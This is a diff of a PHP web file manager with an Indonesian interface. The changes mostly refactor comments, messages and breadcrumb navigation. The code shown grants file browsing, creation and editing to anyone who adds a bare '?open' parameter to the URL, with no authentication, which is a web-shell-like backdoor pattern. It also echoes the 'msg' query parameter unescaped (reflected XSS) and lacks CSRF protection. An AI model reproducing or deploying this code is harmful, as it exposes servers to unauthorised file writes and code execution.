@@ -8,12 +8,14 @@ if (!isset($_GET['open'])) {
     die("Akses ditolak. Gunakan ?open untuk mengakses file manager.");
 }
 
-// Ubah $ROOT_DIR sesuai kebutuhan, misalnya '/home/tutorzoo' jika ingin root dari sana
-$ROOT_DIR = __DIR__; // direktori dasar, ubah ke '/home/tutorzoo' jika diperlukan
+// Root direktori (ubah jika perlu)
+$ROOT_DIR = __DIR__;
 
+/* ====== SAFE PATH ====== */
 function safe_path($root, $path) {
+    $rootReal = realpath($root);
     $real = realpath($root . '/' . $path);
-    if ($real === false || strncmp($real, realpath($root), strlen(realpath($root))) !== 0) {
+    if ($real === false || strncmp($real, $rootReal, strlen($rootReal)) !== 0) {
         return false;
     }
     return $real;
@@ -25,7 +27,7 @@ if ($currentDir === false) $currentDir = $ROOT_DIR;
 
 $msg = "";
 
-// ==== Actions ====
+/* ====== ACTIONS ====== */
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     $action = $_POST['action'];
 
@@ -58,7 +60,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     if ($action === 'create_folder') {
         $fname = trim($_POST['folder_name']);
         if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $fname)) {
-            $msg = "Nama folder tidak valid (hanya alfanumerik, _, -, .)";
+            $msg = "Nama folder tidak valid";
         } elseif (file_exists($currentDir . '/' . $fname)) {
             $msg = "Folder sudah ada";
         } else {
@@ -70,7 +72,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     if ($action === 'create_file') {
         $fname = trim($_POST['file_name']);
         if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $fname)) {
-            $msg = "Nama file tidak valid (hanya alfanumerik, _, -, .)";
+            $msg = "Nama file tidak valid";
         } elseif (file_exists($currentDir . '/' . $fname)) {
             $msg = "File sudah ada";
         } else {
@@ -85,9 +87,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
         if ($newDir !== false) {
             $cwd = $newPath;
             $currentDir = $newDir;
-            $msg = "Berpindah ke direktori: " . $newPath;
+            $msg = "Berpindah ke: " . $newPath;
         } else {
-            $msg = "Path tidak valid atau di luar root.";
+            $msg = "Path tidak valid";
         }
     }
 
@@ -95,12 +97,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     exit;
 }
 
+/* ====== EDIT MODE ====== */
 $editFile = null;
 if (isset($_GET['edit'])) {
     $editPath = safe_path($currentDir, $_GET['edit']);
     if ($editPath && is_file($editPath)) $editFile = $editPath;
 }
 
+/* ====== LIST DIR ====== */
 $items = scandir($currentDir);
 ?>
 <!doctype html>
@@ -122,42 +126,44 @@ input[type=text]{max-width:140px}
 <body>
 <div class="container py-4">
 
-    <div class="mb-3">
-        <h3 class="fw-semibold mb-1">File Manager</h3>
-        <div class="text-secondary">Modern • Minimal • Clean UI</div>
-    </div>
+    <h3 class="fw-semibold mb-1">File Manager</h3>
+    <div class="text-secondary mb-3">Modern • Minimal • Clean UI</div>
 
     <?php if (isset($_GET['msg'])): ?>
-        <div class="alert alert-success shadow-sm card-modern mb-3"><?=$_GET['msg']?></div>
+        <div class="alert alert-success card-modern mb-3"><?=$_GET['msg']?></div>
     <?php endif; ?>
 
     <div class="card card-modern shadow-sm mb-4">
         <div class="card-body d-flex flex-wrap justify-content-between align-items-center gap-2">
+
+            <!-- ====== NAVIGATION PATH (Breadcrumb) ====== -->
             <div>
                 <strong class="text-secondary">Path</strong> :
+
                 <?php
-                // Breadcrumb navigation menggunakan $cwd (path relatif)
-                $parts = $cwd ? explode('/', $cwd) : [];
-                echo '<a class="link-primary" href="?open">/</a>';
-                $pathBuild = '';
-                for ($i = 0; $i < count($parts); $i++) {
-                    $part = $parts[$i];
-                    $pathBuild .= ($pathBuild ? '/' : '') . $part;
-                    if ($i < count($parts) - 1) {
-                        // Link untuk level sebelum current
-                        echo ' <a class="link-primary" href="?open&p='.urlencode($pathBuild).'">'.$part.'</a> /';
-                    } else {
-                        // Bagian terakhir (current) tanpa link
-                        echo ' <span class="text-dark fw-bold">'.$part.'</span> /';
-                    }
+                $cwdRel = trim($cwd, '/');
+                $parts = $cwdRel === '' ? [] : explode('/', $cwdRel);
+
+                echo '<a class="link-primary" href="?open&p=">/</a> ';
+
+                $build = '';
+                foreach ($parts as $part) {
+                    if ($part === '') continue;
+                    $build = ltrim($build . '/' . $part, '/');
+                    echo '<a class="link-primary" href="?open&p='.urlencode($build).'">'
+                        . htmlspecialchars($part) .
+                        '</a> / ';
                 }
                 ?>
             </div>
 
+            <!-- ====== TOOLS ====== -->
             <div class="d-flex gap-2 flex-wrap">
+
                 <form method="post" class="d-flex gap-2">
                     <input type="hidden" name="action" value="cd">
-                    <input type="text" name="cd_path" class="form-control form-control-sm" placeholder="Path relatif dari root" value="<?=htmlspecialchars($cwd)?>" required>
+                    <input type="text" name="cd_path" class="form-control form-control-sm"
+                           placeholder="Path relatif" value="<?=htmlspecialchars($cwd)?>">
                     <button class="btn btn-secondary btn-sm px-3">Go</button>
                 </form>
 
@@ -169,15 +175,18 @@ input[type=text]{max-width:140px}
 
                 <form method="post" class="d-flex gap-2">
                     <input type="hidden" name="action" value="create_folder">
-                    <input type="text" name="folder_name" class="form-control form-control-sm" placeholder="Nama Folder" required>
+                    <input type="text" name="folder_name" class="form-control form-control-sm"
+                           placeholder="Nama Folder" required>
                     <button class="btn btn-success btn-sm px-3">Buat Folder</button>
                 </form>
 
                 <form method="post" class="d-flex gap-2">
                     <input type="hidden" name="action" value="create_file">
-                    <input type="text" name="file_name" class="form-control form-control-sm" placeholder="Nama File" required>
+                    <input type="text" name="file_name" class="form-control form-control-sm"
+                           placeholder="Nama File" required>
                     <button class="btn btn-info btn-sm px-3">Buat File</button>
                 </form>
+
             </div>
         </div>
     </div>
@@ -192,10 +201,8 @@ input[type=text]{max-width:140px}
                 <input type="hidden" name="action" value="save">
                 <input type="hidden" name="file" value="<?=htmlspecialchars($_GET['edit'])?>">
                 <textarea name="content" rows="12" class="form-control mb-3"><?=htmlspecialchars(file_get_contents($editFile))?></textarea>
-                <div class="d-flex gap-2">
-                    <button class="btn btn-primary px-3">Simpan</button>
-                    <a href="?open&p=<?=urlencode($cwd)?>" class="btn btn-outline-secondary">Batal</a>
-                </div>
+                <button class="btn btn-primary px-3">Simpan</button>
+                <a href="?open&p=<?=urlencode($cwd)?>" class="btn btn-outline-secondary ms-2">Batal</a>
             </form>
         </div>
     </div>
@@ -213,12 +220,15 @@ input[type=text]{max-width:140px}
             </tr>
             </thead>
             <tbody>
+
             <?php foreach ($items as $it):
                 if ($it === '.') continue;
                 if ($it === '..' && $currentDir === $ROOT_DIR) continue;
+
                 $rel = trim(($cwd ? $cwd.'/' : '').$it,'/');
                 $full = safe_path($currentDir, $it);
                 if ($full === false) continue;
+
                 $isDir = is_dir($full);
             ?>
             <tr>
@@ -231,9 +241,12 @@ input[type=text]{max-width:140px}
                         <?=$it?>
                     <?php endif; ?>
                 </td>
+
                 <td><?=$isDir ? 'Folder' : 'File'?></td>
                 <td><?=$isDir ? '—' : filesize($full).' bytes'?></td>
+
                 <td class="text-end">
+
                     <?php if(!$isDir): ?>
                         <a class="btn btn-sm btn-outline-primary"
                            href="?open&p=<?=urlencode($cwd)?>&edit=<?=urlencode($it)?>">Edit</a>
@@ -253,9 +266,11 @@ input[type=text]{max-width:140px}
                                placeholder="rename">
                         <button class="btn btn-sm btn-outline-secondary">OK</button>
                     </form>
+
                 </td>
             </tr>
             <?php endforeach; ?>
+
             </tbody>
         </table>
         </div>
